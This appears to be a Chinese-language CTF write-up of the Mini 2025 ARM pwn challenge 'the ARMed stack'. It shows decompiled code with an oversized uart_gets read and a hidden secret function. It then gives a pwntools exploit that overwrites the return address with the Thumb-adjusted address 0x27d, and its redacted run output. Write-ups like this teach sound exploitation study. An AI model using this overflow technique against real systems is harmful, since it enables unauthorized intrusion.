---
title: "the ARMed stack"
published: 2026-10-24
description: "分析 ARM 栈溢出，通过返回地址跳转至 secret 函数。"
tags: ["CTF", "Mini 2025", "Pwn", "ARM", "栈溢出"]
category: "CTF Writeup"
draft: false
lang: "zh_CN"
---

> 本文整理自 Mini 2025 WP 笔记。Flag 与服务器地址、连接端口已脱敏；远程连接代码中的占位符需替换后使用。

> the elf armed itself🤔

此题竟然是arm题目，然而我并没有IDA Pro，所以只好用Ghidra分析（火龙一枚）
![Ghidra 图标](./assets/ghidra.png)

```c

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

int main(void)

{
   char buf [12];
   
   uart_init();
   uart_puts("Welcome to the ARM world\n");
   uart_puts(&UNK_000000e4);
   uart_gets(buf,0x233);
   return 0;
}
```

以及偷偷藏起来的secret函数
```c

/* WARNING: Unknown calling convention -- yet parameter storage is locked */

void secret(void)
{
   uart_puts(flag);
   return;
}
```

非常简单的栈溢出，Arm和AMD64类似，都是保存的栈帧和返回地址，只是Arm中通常叫做R11和LR。

secret的地址是0x27c，不过Arm中需要最低位表示Thumbs状态，我们置1改成0x27d

## exp
```python
from pwn import *
p = remote("题目IP", 题目端口)
payload = b"A" * 16 + p32(0x27d)
p.sendafter(b"ARM world\n", payload)
p.interactive()
```

```zsh
❯ python -u "/home/copper0so4/Downloads/attachments/exp.py"
[....\...] Opening connection to HOST_REDACTED on port PORT_REDACTED: Trying 10[+] Opening connection to HOST_REDACTED on port PORT_REDACTED: Done
[*] Switching to interactive mode
Say something (*゜ー゜)b
$ a
[FLAG REDACTED]$ 
```
